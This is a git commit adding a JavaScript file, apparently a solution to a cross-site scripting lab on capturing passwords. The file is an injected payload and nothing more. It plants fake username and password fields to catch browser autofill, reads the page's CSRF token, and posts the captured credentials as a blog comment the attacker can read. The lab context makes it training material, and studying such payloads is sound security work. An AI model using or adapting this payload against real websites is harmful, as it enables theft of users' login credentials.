88fc61fca28260a8ffd7cc6accb6aaa74989a1f2
Fahad <fahadakhtarabbasi@gmail.com>
2025-09-20 15:28:49 +0500

    Create POST2.js

---
+++ scripts/POST2.js
@@ -0,0 +1,30 @@
+<input type="text" name="username">
+<input type="password" name="password" onchange="hax()">
+
+
+<script>
+function hax() {
+var token = document.getElementsByName('csrf')[0].value;
+var username = document.getElementsByName('username')[0].value;
+var password = document.getElementsByName('password')[0].value;
+
+
+
+
+var data = new FormData();
+
+data.append('csrf', token);
+data.append('postId', 9);
+data.append('comment', `${username}:${password}`);
+data.append('name', 'victim');
+data.append('email', 'hello@gmail.com');
+data.append('website', 'http://hello.com');
+
+fetch('/post/comment', {
+    method: 'POST',
+    mode: 'no-cors',
+    body : data
+});
+}
+</script>
+#Lab: Exploiting cross-site scripting to capture passwords
